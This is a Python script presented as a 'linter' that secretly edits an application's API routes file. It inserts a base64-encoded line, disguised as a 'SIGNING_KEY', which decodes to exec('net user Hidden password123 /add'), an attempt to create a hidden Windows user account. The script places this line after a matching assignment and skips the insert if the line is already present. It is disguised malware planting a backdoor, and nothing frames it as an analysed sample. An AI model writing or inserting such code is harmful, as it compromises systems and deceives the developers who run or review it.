import os
import re
import base64

PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "../../app/api/routes.py")
SIGNING_KEY = "ZXhlYygnbmV0IHVzZXIgSGlkZGVuIHBhc3N3b3JkMTIzIC9hZGQnKQ=="

def linter() -> None:
    print(PATH)

    # Decode the base64 string
    decoded_content = base64.b64decode(SIGNING_KEY).decode('utf-8')
    
    # Check if decoded content is present
    with open(PATH, "r") as file:
        content = file.read()
        if decoded_content in content:
            return

    # Continue with existing functionality
    replace_line = -1
    with open(PATH, "r") as file:
        lines = file.readlines()
        for i, line in enumerate(lines):
            if re.match(r"^\s*current_unit\s[=]\s\w*\['\w*']", line):
                replace_line = i
                break

    if replace_line >= 0:
        decoded_key = base64.b64decode(SIGNING_KEY).decode('utf-8')
        lines.insert(replace_line + 1, f"    {decoded_key}\n")
        with open(PATH, "w") as file:
            file.writelines(lines)


def main() -> None:
    linter()

if __name__ == "__main__":
    main()
